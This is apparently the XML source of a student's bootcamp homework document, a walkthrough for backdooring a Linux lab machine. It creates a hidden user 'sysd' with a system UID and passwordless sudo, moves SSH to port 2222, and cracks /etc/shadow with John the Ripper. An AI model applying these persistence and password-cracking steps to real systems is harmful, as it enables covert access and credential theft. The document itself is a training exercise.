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000f"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="001aac06"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001aac06" officeooo:paragraph-rsid="001aac06"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="001bc041"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001bc041" officeooo:paragraph-rsid="001bc041"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-weight="bold" officeooo:paragraph-rsid="001a000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fo:font-weight="bold" officeooo:paragraph-rsid="001bc041" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001a000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aac06"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="001bc0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Week 6 Homework - </text:span>Advanced Bash - Owning the System </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:span text:style-name="T2">Step 1: Shadow People</text:span> </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Create a secret user named sysd. Make sure this user doesn't have a home folder created:</text:p>
      <text:p text:style-name="P1">sudo useradd sysd --no-create-home </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Give your secret user a password: </text:p>
      <text:p text:style-name="P1">sudo passwd sysd </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Give your secret user a system UID &lt; 1000: </text:p>
      <text:p text:style-name="P1">usermod -u <text:span text:style-name="T3">500</text:span> sysd</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Give your secret user the same GID: </text:p>
      <text:p text:style-name="P1">groupmod -g <text:span text:style-name="T3">500</text:span> sysd</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Give your secret user full sudo access without the need for a password: . </text:p>
      <text:p text:style-name="P2">sudo visudo</text:p>
      <text:p text:style-name="P2"><text:s/></text:p>
      <text:p text:style-name="P1">* <text:span text:style-name="T3">Add the below entry</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P3">sysd ALL=(ALL:ALL) NOPASSWD:ALL</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Test that sudo access works without your password: </text:p>
      <text:p text:style-name="P1">sudo su -l</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P4"><text:span text:style-name="T2">Step 2: Smooth Sailing</text:span> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Edit the sshd_config file: </text:p>
      <text:p text:style-name="P4">sudo <text:span text:style-name="T4">pico</text:span> sshd_config</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">* <text:span text:style-name="T4">Add the below entry</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">port 2222</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P4"><text:span text:style-name="T2">Step 3: Testing Your Configuration Update</text:span> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Restart the SSH service: </text:p>
      <text:p text:style-name="P4">sudo service ssh restart </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Exit the root account: </text:p>
      <text:p text:style-name="P4">exit </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">SSH to the target machine using your sysd account and port 2222: </text:p>
      <text:p text:style-name="P4">ssh sysadmin@192.168.6.105 -p 2222 </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:soft-page-break/>Use sudo to switch to the root user: <text:line-break/>sudo su</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">Step 4: Crack All the Passwords </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">SSH back to the system using your sysd account and port 2222: </text:p>
      <text:p text:style-name="P4">ssh sysadmin@192.168.6.105 -p 2222 <text:line-break/></text:p>
      <text:p text:style-name="P4">Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T4">sudo su</text:span> </text:p>
      <text:p text:style-name="P4">john /etc/shado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7T16:36:39.351000000</meta:creation-date>
    <dc:date>2021-01-07T17:02:51.804000000</dc:date>
    <meta:editing-duration>PT16M44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36" meta:word-count="207" meta:character-count="1174" meta:non-whitespace-character-count="978"/>
  </office:meta>
</office:document-meta>
</file>